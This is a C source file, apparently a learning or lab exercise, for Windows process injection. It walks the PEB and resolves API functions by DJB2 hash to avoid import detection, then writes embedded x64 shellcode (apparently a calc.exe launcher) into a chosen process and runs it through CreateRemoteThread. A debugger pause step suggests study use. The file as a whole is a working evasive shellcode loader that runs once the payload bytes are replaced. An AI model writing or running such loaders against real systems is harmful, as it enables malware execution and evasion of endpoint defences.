#include <windows.h>
#include <stdio.h>

typedef struct _MY_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} MY_UNICODE_STRING;

typedef struct _MY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    MY_UNICODE_STRING FullDllName;
    MY_UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY;

typedef struct _MY_PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} MY_PEB_LDR_DATA;

typedef struct _MY_PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN BitField;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    MY_PEB_LDR_DATA* Ldr;
} MY_PEB;

// 1. DJB2 String Hashing Algorithm
DWORD HashString(const char* str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

// Pre-computed DJB2 Hashes
#define HASH_OPENPROCESS        0x7136FDD6
#define HASH_VIRTUALALLOCEX     0xF36E5AB4
#define HASH_WRITEPROCESSMEMORY 0x6F22E8C8
#define HASH_CREATEREMOTETHREAD 0xAA30775D

// Function Pointer Prototypes
typedef HANDLE(WINAPI* pfnOpenProcess)(DWORD, BOOL, DWORD);
typedef LPVOID(WINAPI* pfnVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* pfnWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE(WINAPI* pfnCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

// 2. Custom PEB Walk for kernel32.dll Base Address
HMODULE GetKernel32Base(void) {
#if defined(_WIN64)
    MY_PEB* pPeb = (MY_PEB*)__readgsqword(0x60);
#else
    MY_PEB* pPeb = (MY_PEB*)__readfsdword(0x30);
#endif

    MY_PEB_LDR_DATA* pLdr = pPeb->Ldr;
    LIST_ENTRY* pListHead = &pLdr->InMemoryOrderModuleList;
    LIST_ENTRY* pCurrent = pListHead->Flink;

    while (pCurrent != pListHead) {
        MY_LDR_DATA_TABLE_ENTRY* pEntry = CONTAINING_RECORD(pCurrent, MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        
        if (pEntry->BaseDllName.Buffer != NULL) {
            wchar_t* dllName = pEntry->BaseDllName.Buffer;
            if ((dllName[0] == L'K' || dllName[0] == L'k') &&
                (dllName[1] == L'E' || dllName[1] == L'e') &&
                (dllName[2] == L'R' || dllName[2] == L'r')) {
                return (HMODULE)pEntry->DllBase;
            }
        }
        pCurrent = pCurrent->Flink;
    }
    return NULL;
}

// 3. Custom EAT Parser & Hash Resolver
FARPROC GetProcAddressByHash(HMODULE hModule, DWORD targetHash) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;

    IMAGE_DATA_DIRECTORY exportDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.VirtualAddress == 0) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDir.VirtualAddress);

    DWORD* pNames = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfNames);
    DWORD* pFunctions = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfFunctions);
    WORD* pOrdinals = (WORD*)((BYTE*)hModule + pExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        char* functionName = (char*)((BYTE*)hModule + pNames[i]);
        if (HashString(functionName) == targetHash) {
            WORD ordinal = pOrdinals[i];
            DWORD functionRVA = pFunctions[ordinal];
            return (FARPROC)((BYTE*)hModule + functionRVA);
        }
    }
    return NULL;
}

int main(void) {
    DWORD targetPID;
    printf("[*] Enter target process ID: ");
    if (scanf("%lu", &targetPID) != 1) return -1;

    HMODULE hKernel32 = GetKernel32Base();
    if (!hKernel32) {
        printf("[-] Failed to locate kernel32.dll base from PEB!\n");
        return -1;
    }

    pfnOpenProcess myOpenProcess = (pfnOpenProcess)GetProcAddressByHash(hKernel32, HASH_OPENPROCESS);
    pfnVirtualAllocEx myVirtualAllocEx = (pfnVirtualAllocEx)GetProcAddressByHash(hKernel32, HASH_VIRTUALALLOCEX);
    pfnWriteProcessMemory myWriteProcessMemory = (pfnWriteProcessMemory)GetProcAddressByHash(hKernel32, HASH_WRITEPROCESSMEMORY);
    pfnCreateRemoteThread myCreateRemoteThread = (pfnCreateRemoteThread)GetProcAddressByHash(hKernel32, HASH_CREATEREMOTETHREAD);

    if (!myOpenProcess || !myVirtualAllocEx || !myWriteProcessMemory || !myCreateRemoteThread) {
        printf("[-] Failed to resolve API hashes!\n");
        return -1;
    }

    printf("[+] API Hashes Resolved Successfully.\n");

    // Full Process Access (0x001F0FFF) to allow execution & thread creation
    HANDLE hProcess = myOpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (!hProcess) {
        printf("[-] OpenProcess failed! Error: %lu\n", GetLastError());
        return -1;
    }
    printf("[+] OpenProcess Successful! Handle: 0x%p\n", hProcess);

    unsigned char shellcode[] = {"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"};
    SIZE_T shellcodeSize = sizeof(shellcode);

    // Allocate Remote Executable Memory (PAGE_EXECUTE_READWRITE = 0x40)
    LPVOID pRemoteMem = myVirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteMem) {
        printf("[-] VirtualAllocEx failed! Error: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return -1;
    }
    printf("[+] Remote Executable Memory Allocated at: 0x%p\n", pRemoteMem);

    // Write Shellcode to Remote Process
    SIZE_T bytesWritten = 0;
    BOOL bWritten = myWriteProcessMemory(hProcess, pRemoteMem, shellcode, shellcodeSize, &bytesWritten);
    if (!bWritten) {
        printf("[-] WriteProcessMemory failed! Error: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return -1;
    }
    printf("[+] Shellcode written successfully (%zu bytes)!\n", bytesWritten);

    // === DEBUG PAUSE FOR x64dbg ATTACH ===
    printf("\n[!] PAUSED: Go to x64dbg -> File -> Attach -> Select PID %lu (Notepad)\n", targetPID);
    printf("[!] Go to Address 0x%p in x64dbg Memory Map/Disassembly and Set Breakpoint (F2)!\n", pRemoteMem);
    printf("[!] Press ENTER in this console to trigger CreateRemoteThread...\n");
    getchar(); getchar();

    // Trigger Execution via Remote Thread
    HANDLE hThread = myCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteMem, NULL, 0, NULL);
    if (!hThread) {
        printf("[-] CreateRemoteThread failed! Error: %lu\n", GetLastError());
    } else {
        printf("[+] CreateRemoteThread Triggered! Thread Handle: 0x%p\n", hThread);
        CloseHandle(hThread);
    }

    CloseHandle(hProcess);
    return 0;
}